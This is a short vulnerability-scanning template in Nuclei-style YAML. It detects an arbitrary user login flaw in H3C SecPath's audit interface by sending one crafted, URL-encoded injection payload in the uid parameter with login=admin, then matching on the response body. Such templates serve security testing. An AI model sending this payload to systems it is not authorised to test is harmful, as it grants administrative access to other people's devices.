id: poc-yaml-h3c-secparh-any-user-login
info:
  name: H3c Secparh Arbitrary User Login Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    This template checks for a vulnerability in H3c Secparh where arbitrary user login is possible.
http:
  - method: GET
    path:
      - "{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "错误的id"
          - "审计管理员"
          - "admin"
